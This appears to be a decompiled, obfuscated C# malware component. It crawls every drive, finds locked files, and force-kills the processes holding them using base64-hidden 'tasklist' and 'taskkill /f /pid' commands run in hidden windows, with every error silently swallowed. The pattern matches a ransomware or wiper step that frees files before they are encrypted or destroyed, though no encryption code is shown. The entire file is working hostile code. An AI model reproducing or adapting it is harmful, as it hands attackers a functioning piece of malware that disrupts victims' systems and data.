using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace LSMgrTguKYchoUzfqQ;

internal class gkqsFnLNsaPC
{
	[CompilerGenerated]
	private sealed class LcIcYIllCzSKQ
	{
		public string sKMVHmKhkilsA;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(sKMVHmKhkilsA);
		}
	}

	public static readonly List<string> cVJTAFfzCgBYo = new List<string>();

	public static readonly List<string> suUaJFpRyVWJs = new List<string>();

	public static void wSmOtBxFjWynxvRre()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					OnQVzeAjbVJe(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void OnQVzeAjbVJe(string TtxJHVQEvIYf)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(TtxJHVQEvIYf);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					cVJTAFfzCgBYo.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					OnQVzeAjbVJe(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (cVJTAFfzCgBYo.Count <= 0)
		{
			return;
		}
		foreach (string item in cVJTAFfzCgBYo.Where((string tcokSolAwtY) => UuibpKQXVzQll(tcokSolAwtY)))
		{
			suUaJFpRyVWJs.Add(item);
		}
		cVJTAFfzCgBYo.Clear();
		if (suUaJFpRyVWJs.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in suUaJFpRyVWJs.Select((string NmbDklZDZuBh) => new FileInfo(NmbDklZDZuBh)))
		{
			IbIrMsEgVUA(item2.Name);
		}
	}

	public static bool UuibpKQXVzQll(string xnPJOZtbyjutJKO)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(xnPJOZtbyjutJKO, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(xnPJOZtbyjutJKO, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void IbIrMsEgVUA(string vOwqyNZcUWsQYYX)
	{
		try
		{
			string text = wgxXzJOJOd(VSCOSikLsIYu.AKDOdYwKlSeS("dGFza2xpc3Q="), VSCOSikLsIYu.AKDOdYwKlSeS("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(vOwqyNZcUWsQYYX)
				select t into awWpFfqjzHzu
				select awWpFfqjzHzu.Split(new char[1] { ',' }) into snHSwewyLFLAJLp
				select snHSwewyLFLAJLp[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				wgxXzJOJOd(VSCOSikLsIYu.AKDOdYwKlSeS("dGFza2tpbGw="), VSCOSikLsIYu.AKDOdYwKlSeS("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string wgxXzJOJOd(string ofiapMSUTJw, string xLHBIOVQLWXeU)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(ofiapMSUTJw, xLHBIOVQLWXeU);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
